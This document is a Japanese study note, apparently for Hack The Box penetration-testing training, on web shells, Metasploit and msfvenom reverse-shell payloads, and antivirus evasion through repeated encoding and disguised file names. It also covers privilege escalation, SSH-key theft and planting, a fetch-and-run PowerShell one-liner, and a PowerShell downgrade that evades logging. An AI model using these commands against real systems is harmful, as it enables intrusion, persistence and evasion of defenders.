	- `asp, aspx, jsp, php,`などを含む多くの異なるwebシェルの一覧がある
	- `/usr/share/laudanum`にある
	- Laudanum内のほとんどのファイルについては、そのままコピーして、被害者の実行に必要な場所に配置できる
	- シェルなどの特定のファイルについては、最初にファイルを編集して`attacking`するホストのIPアドレスを挿入して、Webシェルにアクセスしたり、リバースシェルを使用するインスタンスでコールバックを受信したりする必要がある
	- 59行目に攻撃者のIPも書き加える
- Antak
	- `/usr/share/nishang/Antak-WebShell`にある
	- Powershellコマンドを使えるwebシェル
	- 編集する必要がある
		- 14行目を、ユーザー（緑の矢印）とパスワード（オレンジ色の矢印）を追加する
	- 以下の画像のように付け加える

![](https://i.imgur.com/BVfKA3s.png)

### その他のペイロード生成ツール

|                                   |                                                                                                                                                                                                              |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSFは、あらゆるペンテスターのツールキットのための非常に汎用性の高いツールです。これは、ホストを列挙し、ペイロードを生成し、パブリックエクスプロイトとカスタムエクスプロイトを利用し、ホストで一度エクスプロイト後のアクションを実行する方法として機能します。スイスアーミーナイフと考えてください。 |
| `Payloads All The Things`         | [ソース](https://github.com/swisskyrepo/PayloadsAllTheThings) ここでは、ペイロード生成と一般的な方法論に関するさまざまなリソースとチートシートを見つけることができます。                                                                                             |
| `Mythic C2 Framework`             | [ソース](https://github.com/its-a-feature/Mythic) Mythic C2フレームワークは、独自のペイロード生成のためのコマンドおよび制御フレームワークおよびツールボックスとしてのMetasploitの代替オプションです。                                                                           |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishangは、Offensive PowerShellインプラントとスクリプトのフレームワークコレクションです。これには、どのペンテスターにも役立つ多くのユーティリティが含まれています。                                                             |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmourは、Windowsホストに対して使用するために難読化されたバイナリを生成して利用するツールです。                                                                                                    |


# Metasploit 
なんか検索全体で、こんな感じで、`grep` で検索できるらしい
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```
## Moduleのタイプ
- Auxiliary  
    スキャン、ファズ、スニッフィング、管理などの補助的な機能を提供し、追加サポートを行います。
- Encoders
    ペイロードがターゲットに正しく届くように変換処理を行います。
- Exploits  
    ペイロードの配信を可能にする脆弱性を突くモジュールです。
- NOPs
    （No-Operationの略）エクスプロイト実行時にペイロードのサイズを一定に保つ役割を果たします。
- Payloads
    リモートでコードを実行し、攻撃者のマシンにコールバックして接続（またはシェル）を確立します。
- Plugins
    追加スクリプトがmsfconsoleに統合され、評価作業をサポートします。
- Post
    情報収集やさらなるネットワーク内移動（ピボット）のための各種モジュールです。

- モジュールについてさらに知りたいとき : モジュールを選択した後、コマンド`info`


## Targetsについて
- ターゲットには、Internet Explorerの異なるバージョンや様々なWindowsバージョンが含まれる  
- 「Automatic」を選択すると、msfconsoleは攻撃成功前に指定されたターゲットでのサービス検出を行う
- 対象システムのバージョンが分かっている場合は、`show targets`の後に、`set target <index no.>`コマンドでリストから適切なターゲットを選択できる  
- ターゲットは、選択したエクスプロイトモジュールを特定のOSバージョンに適応させるための一意の識別子として機能する  

## Payloadについて
- 中でMsfvenomが動いているので、上のMsfvenomの説明
- `grep meterpreter show payloads`で検索して、`set payload`で設定して、`show payload options`でオプションを検索する

Metaploit内では、以下で、payloadとencordを行える
- 利用可能なペイロードと同様に、エンコーダもエクスプロイトモジュールに従って自動的にフィルタリングされ、互換性のあるペイロードのみが表示される
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```


### MSFVenom
- ペイロード生成とエンコードを一括で行える
- ペイロード作成
	- 各種OS・アーキテクチャ向けに多様なペイロードを生成
	- リバースシェルやバインドシェル、Meterpreterなど、Metasploitが提供するペイロードを一括で扱える
- ペイロードの暗号化・エンコード
	- MSFvenomの機能により、ウイルス対策ソフトに検知されにくい形でペイロードを作成可能
	- エンコードや暗号化を利用することで、一般的なシグネチャをバイパスできる可能性が高まる
- ソーシャルエンジニアリングとの組み合わせ
	- メールに添付して実行を誘導したり、悪意あるWebリンクとして配布するなど、多彩な攻撃シナリオで活用
	- 直接ネットワーク経由で攻撃できない場合に、ユーザーダブルクリック誘導などがよく使われる方法

- ペイロードのリストの一覧を表示する
```shell-session
msfvenom -l payloads
```

Descriptionに書いてあるstagedとstagelessの違い
- staged
	- マルウェアのダウンローダーみたいな感じで、最初に実行して、外部サーバーから本命の大きなペイロード実行ファイルをダウンロードして、実行する
	- メモリを食う
	- ターゲットのネットワークが安定していないと無理
- stageless
	- ステージなしでネットワーク接続を介して全体として送信される
	- 十分のネットワークリソースにアクセスできない環境で、遅延が干渉する可能性がある場合に有効
	- **ステージレスペイロードの方が良い！**
	- ソーシャルエンジニアリングの時も回避しやすい
- 見分け方
	- 名前に`/`で細かく区切りが多い→staged
		- 例 : `windows/meterpreter/reverse_tcp`
	- `_`で機能がまとまっていれば→stageless
		- 例 : `windows/meterpreter_reverse_tcp`

**Windowsの代表的なペイロード**

| ペイロード                           | 説明                                               |
| ------------------------------- | ------------------------------------------------ |
| generic/custom                  | 汎用リスナー、マルチユース                                    |
| generic/shell_bind_tcp          | 汎用リスナー、マルチユース、通常のシェル、TCP接続のバインド                  |
| generic/shell_reverse_tcp       | 汎用リスナー、マルチユース、通常のシェル、リバースTCP接続                   |
| windows/x64/exec                | 任意のコマンドを実行 (Windows x64)                         |
| windows/x64/loadlibrary         | 任意のx64ライブラリパスをロード                                |
| windows/x64/messagebox          | MessageBoxを使用して、タイトル、テキスト、アイコンをカスタマイズ可能なダイアログを生成 |
| windows/x64/shell_reverse_tcp   | 通常のシェル、単一ペイロード、リバースTCP接続                         |
| windows/x64/shell/reverse_tcp   | 通常のシェル、ステージャー＋ステージ、リバースTCP接続                     |
| windows/x64/shell/bind_ipv6_tcp | 通常のシェル、ステージャー＋ステージ、IPv6 Bind TCPステージャー           |
| windows/x64/meterpreter/$       | Meterpreterペイロード＋上記の各種バリエーション                    |
| windows/x64/powershell/$        | 対話型PowerShellセッション＋上記の各種バリエーション                  |
| windows/x64/vncinject/$         | VNCサーバー（反射型インジェクション）＋上記の各種バリエーション                |


### ペイロードの作成
エンコードなし
```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

| **オプション/要素**                     | **役割・説明**                                                                 |
| -------------------------------- | ------------------------------------------------------------------------- |
| `-p linux/x64/shell_reverse_tcp` | ペイロードの指定 : Linux 64ビット向けの“reverse TCP shell”を生成。実行すると、攻撃者側に逆接続してシェルを提供する。 |
| `LHOST=10.10.14.113`             | 攻撃者のIPアドレス: ペイロードが確立しようとする攻撃者（こちら側）のIPアドレス。                               |
| `LPORT=443`                      | 攻撃者のポート番号: ペイロードが接続を試みるポート番号。ここでは443を使用。                                  |
| `-f elf`                         | 出力ファイル形式の指定 : 生成するファイルをLinux向けのELF形式にする。                                  |
| `> createbackup.elf`             | 標準出力のリダイレクト : 作成されたバイナリを`createbackup.elf`として保存する。                        |

### エンコード
エンコーダの役割
- 異なるアーキテクチャへの対応
	- ペイロードを異なるプロセッサアーキテクチャ（x64、x86、SPARC、PPC、MIPSなど）やOS上で動作させるために変換する役割を担っています。
- アンチウイルス（AV）回避
- ペイロード内に含まれる「bad characters」と呼ばれる16進数のオペコードを除去したり、ペイロードを異なるフォーマットにエンコードすることで、アンチウイルスによる検出を回避しやすくします。
	- ※ただし、IPS/IDSメーカーが保護ソフトを進化させたため、AV回避専用のエンコーダーの効果は時間とともに薄れてきています。

Shikata Ga Nai (SGN) について
- 現在最も利用されているエンコーディング方式の一つであるSGNは、かつては検出が非常に困難なため、SGNでエンコードされたペイロードはほぼ検出不可能とされていました。
- 名前「仕方がない」は「どうしようもない」という意味で、数年前にはその通りに感じられたでしょう。しかし、現代ではSGNだけでは万能ではなく、保護システムを回避するために他の手法も検討されています。

shikata_ga_naiでエンコード
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

| オプション                          | 説明                                        |
| ------------------------------ | ----------------------------------------- |
| `-a x86`                       | アーキテクチャを x86 に指定                          |
| `--platform windows`           | プラットフォームを Windows に指定                     |
| `-p windows/shell/reverse_tcp` | ペイロードとして Windows のシェル（リバースTCP接続）を選択       |
| `LHOST=127.0.0.1`              | 攻撃者側（リスナー）のIPアドレスを 127.0.0.1 に設定          |
| `LPORT=4444`                   | 攻撃者側（リスナー）のポート番号を 4444 に設定                |
| `-b "\x00"`                    | ペイロードから除外するバッドキャラクターとして NULL を指定          |
| `-f perl`                      | 出力形式を Perl スクリプト形式に指定                     |
| `-e x86/shikata_ga_nai`        | エンコーダーとして x86/shikata_ga_nai を使用（エンコード処理） |

エンコードなし
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

#### AVの回避
最近のAVでは、それぞれのエンコードを一回行っても全然検知されてしまう
- 1つの簡単なAV回避の方法は、同じエンコーディングを反復してエンコードしてみること
	- でも全然回避できないことが多いから、他の方法を使ったほうがいい
```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
- Metasploitは、APIキーでペイロードを分析することができる`msf-virustotal`と呼ばれるツールを提供しているから、それで確認して、AVの回避を向上させるのも面白いかもしれない
	- VirusTotalへの無料登録が必要
こんな感じで使えるらしい
```shell-session
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

### 実行手順の流れ
1. 攻撃者が `msfvenom` コマンドでペイロードを生成（`createbackup.elf`）
2. 攻撃者側がリスナーを開いて待ち受けておく
	- `sudo nc -lvnp 443`
3. ターゲットにいずれかの方法でダウンロードさせる
##### Linux・Windows共通
- ファイル添付メール
- ウェブサイトのダウンロードリンク
- Metasploitエクスプロイトモジュールと組み合わせる（これはおそらく、すでに内部ネットワーク上にいる必要があります）。
- オンサイト侵入テストの一環として、フラッシュドライブを介して。
##### Windows
- Impacket
	- ネットワーク プロトコルと直接対話する方法を提供する Python の組み込みツールセット
	- `psexec`、`smbclient`、`wmi`、Kerberos、およびSMBサーバーをスタンドアップする能力を扱っているコマンド
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): は、ホスト間でファイルを便利に転送するのに役立つ迅速なワンライナーを見つけるための優れたリソース
- SMB
	- 被害者のホストがドメインに参加し、共有を利用してデータをホストする場合に特に便利
	- 攻撃者として、これらのSMBファイル共有を`C$`と`admin$`とともに使用して、ペイロードをホストして転送し、リンクを介してデータを流出させることさえできた
- `Remote execution via MSF`
	- Metasploitの多くのエクスプロイトモジュールに組み込まれているのは、ペイロードを自動的に構築、ステージング、実行する関数
- 他のプロトコル
	- ホストを見ると、FTP、TFTP、HTTP/Sなどのプロトコルは、ホストにファイルをアップロードする方法をがあるかも
	- オープンで使用できる機能を列挙して探そう！

4. ターゲットで `createbackup.elf` を実行（適宜権限を付与し実行）
5. 実行されたプログラムが `LHOST` : `LPORT` へ接続
6. ncで待ち受けていた攻撃者側がシェルを取得できる
- Windowsでは、`encoding`や`encryption`がなければ、この形式のペイロードはほぼ確実にWindows Defender AVによって検出される
- BonusCompensationPDF.exeなんだけど、一般の人はあんまり拡張子をつけないから実行できるとかね

### Windowsファイル形式
 ペイロードの時、どのファイルを選んだらいいの？
- **DLL (Dynamic Link Library)**
    - **Microsoft OS で使用されるライブラリファイル**
    - 複数のプログラムで同時に利用可能な**共有コードとデータ**を提供
    - モジュール化されたアプリケーション構成を可能にし、**アップデートやメンテナンスが容易**
    - **ペンテスター視点**: 悪意ある DLL の注入やライブラリのハイジャックにより、**SYSTEM 権限昇格**や**UAC (ユーザーアカウント制御) のバイパス**を狙える
- **バッチ (Batch) ファイル**
    
    - **テキストベースの DOS スクリプト** (`.bat`)
    - コマンドラインインタプリタを介して**複数のタスクを自動実行**
    - システム上でのコマンド実行を容易にし、ポートを開く・攻撃者側への接続などの仕掛けが可能
    - **ペンテスター視点**: 基本的な列挙を実行させたり、オープンポート経由で情報を取得するなど、自動化に利用
- **VBS (VBScript)**
    
    - **Microsoft Visual Basic ベース**の軽量スクリプト言語
    - もともと**動的なウェブページ用** (クライアントサイドスクリプト) として利用されていた
    - **最新ブラウザでは非推奨・無効**が多い
    - **ペンテスター視点**: フィッシングや Excel マクロなど、**ユーザーの操作を誘導**してコードを Windows スクリプトエンジンで実行させる手口で依然活用される
- **MSI (.msi ファイル)**
    
    - **Windows インストーラーのインストールデータベース**として機能
    - 新しいアプリをインストールする際、`.msi` ファイルを参照して必要コンポーネントを取得
    - **ペンテスター視点**: ペイロードを `.msi` 化することで **Windows インストーラー**を利用し、`msiexec` コマンドで実行可能
    - インストール後に**昇格権限のリバースシェル**などを得ることができる
- **PowerShell**
    
    - **シェル環境 + スクリプト言語** (Microsoft OS での最新シェル)
    - **.NET Common Language Runtime** 上で動作し、**.NETオブジェクト**を入出力として扱う
    - **ペンテスター視点**: シェルの取得やホスト上でのスクリプト実行など、**侵入テストで幅広く活用**できる多数のオプションを提供

 CMDとPSどっちのターミナル言語使えばいいの？

  CMD を使用する場合
- 古いホストで PowerShell が含まれていない可能性があるとき
- ホストに対してシンプルな操作やアクセスだけが必要なとき
- シンプルなバッチファイル、net コマンド、または MS-DOS ネイティブツールを使用する予定のとき
- スクリプトやその他のアクションの実行に影響する可能性がある実行ポリシーを回避したいとき

PowerShell を使用する場合
- Cmdlet やその他の独自スクリプトを活用する予定のとき
- テキスト出力ではなく .NET オブジェクトとして操作したいとき
- ステルス性がさほど重要でないとき
- クラウドベースのサービスやホストとやり取りする予定のとき
- スクリプト内でエイリアス（Aliases）を設定・使用するとき

##### 侵入口としてのWSL
- **WSL（Windows Subsystem for Linux）**
    - ホストに組み込まれた仮想 Linux 環境を提供
    - OS の急速な変化に伴い、新たなホストアクセス手法を可能にする可能性
    - Python3 と Linux バイナリを利用して、WSL を介し Windows ホストにペイロードをダウンロード・インストールするマルウェアが確認されている
    - 攻撃者は Windows と Linux 双方にネイティブな Python ライブラリを使い、PowerShell と組み合わせてホスト上で別のアクションを実行
    - **WSL インスタンスとの通信（ネットワーク要求や機能）は Windows ファイアウォールや Windows Defender で解析されず、ホストの死角となる**
- **PowerShell Core**
    - Linux オペレーティングシステム上にもインストール可能
    - 多くの通常の PowerShell 機能を引き継いでいる
    - 攻撃ベクトルや監視手法がまだ十分に知られていないため、潜在的に卑劣な手段として利用されうる
    - AV や EDR の検出メカニズムを回避する目的で使用される事例がある

### ファイアーウォールとIDS/IPS回避
- https://academy.hackthebox.com/module/39/section/416


## DatabaseMsfconsoleについて
- スキャン結果、エントリーポイント、検出された脆弱性、収集された資格情報などの情報を整理・管理するために使える
- msfconsoleではPostgreSQLが使用され、結果のインポートやエクスポートも可能
なんか今のところあんまり使いたい意欲ないから、使いたくなったら、ここに詳しく書いてあるよ
- https://academy.hackthebox.com/module/39/section/411


## Pluginについて
なんか今のところあんまり使いたい意欲ないから、使いたくなったら、ここに詳しく書いてあるよ
- https://academy.hackthebox.com/module/39/section/413
- プラグイン作るとかだったら面白そうと思うんだけどね

## **セッション管理**
- Meterpreterは繋げるまま、一旦Meterpreterから抜ける
```sh
background
```

- セッション一覧表示

```bash
sessions -l
```

- セッション接続・セッションに戻る

```bash
sessions -i <セッション番号>
```

- セッション全終了

```bash
sessions -K
```

### **特権昇格の発見とエクスプロイト**

Mesterpreterでユーザー権限でセッションが確立している時、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができる
```bash
use post/multi/recon/local_exploit_suggester
set SESSION <セッション番号>
run
```


# シェルアップデート
- linux
	- python3 -c 'import pty; pty.spawn("/bin/bash")'
	- /bin/sh -i
	- perl —e 'exec "/bin/sh";'
	- awk 'BEGIN {system("/bin/sh")}'
	- find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
	- find . -exec /bin/sh \; -quit
	- vim -c ':!/bin/sh'
	- 以下は、スクリプトで書いて実行する必要がある
		- perl: exec "/bin/sh";
		- ruby: exec "/bin/sh"
		- lua: os.execute('/bin/sh')
Vimのセッション内でもできる
```shell-session
vim
:set shell=/bin/sh
:shell
```

- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
sudo apt update
sudo apt install rlwrap
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```

# 横展開

## Linux
リバースシェルで、ログインした時、最初は、「www-data」であることがある。
その時、www-dataのパスワードがわからないので横展開が必要

- データベース情報を書き換える・新規追加
	- ローカルの空いてるポート見つけるコマンド
		- `netstat -tuln`
	- データベースの種類を見分ける方法
		- **ポート番号3306**は、MySQLまたはMariaDBのデフォルトポート
		- **ポート番号:5432**:PostgreSQL

- HTBでの認証情報の使い回し
	- webのログインで取得したパスワードとサーバー上のユーザーが同じことがある
	- DBの設定ファイルにあるパスワードとsshのパスワードが同じ

- **`/etc/passwd` から有効なシェルを持つユーザーの確認**
	- `/etc/passwd` の最後のフィールドは、**そのユーザーのデフォルトシェル** を示している。  
	- `/bin/bash` ・`/bin/sh`
		-  ユーザーは、**通常のログインが可能**。
		- 横展開先のユーザーに最適
	- **`/usr/sbin/nologin`**
	    - このシェルが設定されているユーザーは、**ログインできない** ように制限されている。
	    - 例えば、`www-data` や `mysql` などのシステムユーザーに設定されている。
	- **`/bin/false`**
	    - これもログインを拒否するための設定。
	    - `false` コマンドは何もせず終了するため、**ログインを試みても即ログアウトする**。
	横展開先のユーザーを探す時に使える。

### ディレクトリトラバーサル
- 以下のリンクのディレクトリトラバーサル試していく
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md#path-traversal
- [[Web Server Side Attack#LFIスキャンの流れ]]

## ピポット・トンネリング・ポートフォワーディング
[[Pivoting・Tunneling ・Port Forwarding]]

# 権限昇格
- 現在のユーザーで、sudo コマンドを使用して実行可能なコマンドや権限を確認する
```bash
sudo -l
```
- 正直HTBのEasyとかMediumの一部では、このコマンド打って、NoPasswordって書いてあるスクリプトをsudo権限で実行すれば権限昇格できる。

- ここにまとまってるから、あとでまとめる
	- https://scrapbox.io/tadanomemo777/Linux_%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC

### 権限昇格で使えるチェックリスト
- [HackTricks](https://book.hacktricks.xyz/) 
	- [Linux](https://book.hacktricks.wiki/ja/linux-hardening/linux-privilege-escalation-checklist.html) と [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) の両方のローカル特権の昇格に関する優れたチェックリスト
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) 
	- [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) と [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) の両方のチェックリストがある

### 自動列挙ツール
- 上記のコマンドの多くは、レポートを調べて弱点を探すためにスクリプトで自動的に実行される場合がある
- 興味深い結果を返す一般的なコマンドを実行することで、多くのスクリプトを実行してサーバーを自動的に列挙できる
- 一般的な Linux 列挙スクリプトには、[LinEnum](https://github.com/rebootuser/LinEnum.git) と [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) があり、Windows には [Seatbelt](https://github.com/GhostPack/Seatbelt) と [JAWS ](https://github.com/411Hall/JAWS)がある。
- [Privilege Escalation Awesome Scripts SUITE（PEASS）](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
	- 最新の状態に保つために適切に維持されており、LinuxとWindowsの両方を列挙するためのスクリプトが含まれている
しかし、自動列挙ツールはウイルス対策ソフトウェアまたはセキュリティ監視ソフトウェアをトリガーする可能性のある多くの「ノイズ」を生成するので、スクリプトの実行が妨げられたり、システムが侵害されたというアラームがトリガーされたりする可能性がある。場合によっては、スクリプトを実行する代わりに手動列挙を実行する必要がある。

これらのスクリプトの出力で、探すべき脆弱性
- カーネルエクスプロイト
	- 普通にバージョンが古いOSだと、パッチが当たってないから、脆弱性になりうる
- 脆弱なソフトウェア
	- linux : `dpkg -l`
		- インストールされているソフトウェアが、古いバージョンの時、脆弱性がある場合がある。
	- Windows : `C:\Program Files`以下を見る
- ユーザー権限
	- Sudo
		- `sudo -l`
			- (ALL : ALL) ALL 
				- `sudo`ですべてのコマンドを実行でき、完全なアクセス権を与え、`sudo`で`su`コマンドを使用してルートユーザーに切り替えることができると述べています。
			- (user : user) NOPASSWD: /bin/echo
				- `sudo`でコマンドを実行するにはパスワードが必要です。特定のアプリケーション、またはすべてのアプリケーションをパスワードなしで実行できる場合があり
	- SUID
		- SUID バイナリ (Set User ID) を検索して一覧表示する
		- `find / -type f -perm -04000 -ls 2>/dev/null`
	- Windows Token Privileges
		-  GTFOBins : https://gtfobins.github.io
		- Windows版 GTFOBins : https://lolbas-project.github.io/#


スケジュールされたタスク
- スケジュールされたタスク（Windows）またはcronジョブ（Linux）を利用して特権をエスカレーションするには、通常2つの方法があります。
	- 新しいスケジュールされたタスク/cronジョブを追加する
	- 悪意のあるソフトウェアを実行するように彼らをだます
	- 新しいスケジュールされたタスクを追加できるかどうかを確認する
		- /etc/crontab
		- /etc/cron.d
		- /var/spool/cron/crontabs/root
		- cronジョブによって呼び出されたディレクトリに書き込むことができれば、実行時にリバースシェルを送信するリバースシェルコマンドでbashスクリプトを記述できる

SSHキー
- 特定のユーザーの .ssh を読み取れるアクセス権がある場合
	- 以下のプライベート ssh キーを参照・コピー
		- `cat /root/.ssh/id_rsa`
		- `cat /user1/.ssh/id_rsa`
	- ローカルにペースト・権限を与える
		- `nano id_rsa`
		- `chmod 600 id_rsa`
	- ローカルから接続
		- `ssh root@94.237.53.117 -p 53658 -i id_rsa`

ユーザー`/.ssh/`ディレクトリへの書き込みアクセス権がある場合
- ユーザーのsshディレクトリの/home/user/.ssh/authorized_keysに公開鍵を配置
- 出力ファイルを指定するには、まず ssh-keygen と -f フラグで新しいキーを作成する
```shell-session
#攻撃者PC
ssh-keygen -f key
```
- `key`（`ssh -i`で使用します）と`key.pub`の2つのファイル
- `key.pub`をコピーして、リモートマシンで`/root/.ssh/authorized_keys`に追加
- 被害者PCで実行
```shell-session
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
- これで、リモートサーバーは、秘密鍵を使用してそのユーザーとしてログインできるはず
```shell-session
snowyowl644@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```


## LOLBANS
Living Off the Landで使うための辞書的存在
- 環境にあるものだけでやりくりする
	- つまり、Windows/Active Directoryに標準で備わっているツールやコマンドだけを使う手法に頼らざるを得ない
- また、他のツールを使うことで、アラートも少なくなる可能性がある
	- IPS/IDSなどが、通常の通信とは異なる通信ということでアラートが出るようになっている可能性もあるため

LOLBANSについてまとめているサイト
- Windows
	- https://lolbas-project.github.io
- Linux
	- https://gtfobins.github.io/

その他、使えるコマンド
### Windows
Powershell上で実行
#### 基本的な列挙

| **コマンド**                                                                                   | **結果**                                                                                 |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------- |
| hostname                                                                                   | PCの名前を表示する                                                                             |
| [System.Environment]::OSVersion.Version                                                    | OSのバージョンとリビジョンレベルを表示する                                                                 |
| wmic qfe get Caption,Description,HotFixID,InstalledOn                                      | ホストに適用されているパッチやホットフィックスの一覧を表示する                                                        |
| ipconfig /all                                                                              | ネットワークアダプターの状態と構成を表示する                                                                 |
| set                                                                                        | 現在のセッションでの環境変数一覧を表示する（CMDプロンプトから実行）                                                    |
| echo %USERDOMAIN%                                                                          | ホストが所属しているドメイン名を表示する（CMDプロンプトから実行）                                                     |
| echo %logonserver%                                                                         | ホストがチェックインしているドメインコントローラーの名前を表示する（CMDプロンプトから実行）                                        |
| **systeminfo**                                                                             | 上のコマンド達の結果をこのコマンドで表示できる                                                                |
| Get-Module                                                                                 | 使用可能な（ロードされている）モジュールの一覧を表示                                                             |
| Get-ExecutionPolicy -List                                                                  | ホスト上の各スコープごとの実行ポリシー設定を表示                                                               |
| Set-ExecutionPolicy Bypass -Scope Process                                                  | -Scope パラメータを使用して、現在のプロセスだけに実行ポリシーを一時的に変更する。このプロセスを終了すると元に戻るため、ホストに恒久的な変更を加えずに済む       |
| `Get-ChildItem Env:\| ft Key,Value`                                                        | 環境変数（キーと値のペア）を一覧表示し、パス、ユーザー名、コンピュータ情報などを取得                                             |
| Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   | 特定ユーザーのPowerShellコマンド履歴を取得します。この履歴にはパスワードや、パスワードが含まれる設定ファイル／スクリプトの手がかりがある場合もあるため、有用です。 |
| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('ダウンロード元のURL'); <続くコマンド>" | Web上からファイルをダウンロードして、メモリ上で実行するためのシンプルかつ迅速な方法です。                                         |
#### 運用上のセキュリティ戦術

Powershellのダウングレード
- ディフェンス側は、1台のホストに複数バージョンのPowerShellが存在している可能性があることに気づいていないことがある
	- アンインストールされていなければ、古いバージョンも依然として使用可能
	- PowerShellの**イベントログ記録機能は、PowerShell 3.0以降で導入された**機能
	- 逆に、PowerShell 2.0以前のバージョンを呼び出すことができれば、そのシェル上での操作はEvent Viewer（イベントビューア）に記録されない
	- **ディフェンダーの監視の目をかいくぐる**ための優れた方法の一つ
Powershellをダウングレードするコマンド
```sh
powershell.exe -version 2
```

本当にダウングレードできているのか
- ダウングレードする前とダウングレードした後に`Get-Host`コマンドを打って、出力結果の`Version`の部分を見る
- ダウングレードした後のVersionが2.0になっていなければOK

本当にログが記録されていないか
- PowerShell Operationalログ
	- 場所：`Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`
	- → ここには、セッション内で実行されたすべてのコマンドが記録されるはずなので、ここに記録されていなければ大丈夫
- Windows PowerShellログ
	- 場所：`Applications and Services Logs > Windows PowerShell`
	- → PowerShellを起動したときに、そのインスタンスがログとして記録されるので、ここに記録されていなければ大丈夫
- 注意点
	- PowerShellセッション内で powershellのダウングレードを実行したという操作自体はログに記録される

#### 防御機構の確認
Windowsファイアーウォールの設定状態や、稼働状況を確認する

ファイアーウォールの確認
- 全てのファイアーウォールプロファイル(ドメイン・プライベート・パブリック)に関する設定情報が表示できる
```sh
PS C:\htb> netsh advfirewall show allprofiles
```

Windows Defenderの確認
cmd.exeで実行
- STATEの部分に注目する
```sh
C:\htb> sc query windefend
```

Defender の詳細なステータスや構成設定を確認する
```sh
PS C:\htb> Get-MpComputerStatus
```

**自分以外に誰かログインしていないか**
- 自分以外もログインしていた場合、ポップアップウィンドウが出たり、強制ログアウトさせられることがある
- なので、まず侵入した時は自分以外に誰かログインしていないかを確認する
```powershell-session
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```
STATEの見方

| STATE                  | 意味                          | 誰かログインしてる？ | 補足                        |
| ---------------------- | --------------------------- | ---------- | ------------------------- |
| **Active**             | セッションが**アクティブ（操作中）**        | ✅ はい       | ユーザーが現在ログイン＆使ってる状態        |
| **Disc**（Disconnected） | セッションが**切断された**（ログイン中だが未使用） | ✅ はい       | RDP切断後とか。まだメモリ上にセッションはある  |
| **Listen**             | セッション待機中（**接続待ち状態**）        | ❌ いいえ      | 誰もログインしてないが、RDP接続を待っている状態 |
| **Idle**               | 放置状態（Activeのまま時間が経過）        | ✅ はい       | 実際はActiveと同じ扱いになることもある    |
類似コマンド
- Windows環境で現在ログインしているユーザーのセッション情報を一覧表示するコマンド
```sh
query user
```

#### ネットワーク情報
- 現在のホストが把握している他のホストやネットワークを表示する
- ルーティングテーブルに表示されるネットワーク
	- ホストが頻繁にアクセスしているか、もしくは管理者によってルートが明示的に設定されている
	- つまり、そのネットワーク上にあるドメインのリソースにアクセスする手段を知っているということ

これらのコマンドは、ブラックボックス型の探索フェーズで役にたつ
パッシブな情報収集手段として非常に有効
**AD環境の列挙に役立つだけでなく、他のネットワークセグメントへのピボット（横展開）機会を見つける助け**にもなる

| **ネットワーク系コマンド**                    | **説明**                                                          |
| ---------------------------------- | --------------------------------------------------------------- |
| arp -a                             | ARPテーブルに記録されている既知のホスト一覧を表示                                      |
| ipconfig /all                      | ホストのネットワークアダプタ設定を出力する。ネットワークセグメントを把握できる                         |
| route print                        | ルーティングテーブル（IPv4 & IPv6）を表示する。ホストが認識しているネットワークやレイヤー3のルート情報が確認できる |
| netsh advfirewall show allprofiles | ホストのファイアウォールの状態を表示する。アクティブかどうか、トラフィックをフィルタリングしているかなどを確認できる      |
#### WMI
- WMI : Windows Management Instrumentationは、Windowsの企業環境で広く使われているスクリプトエンジン
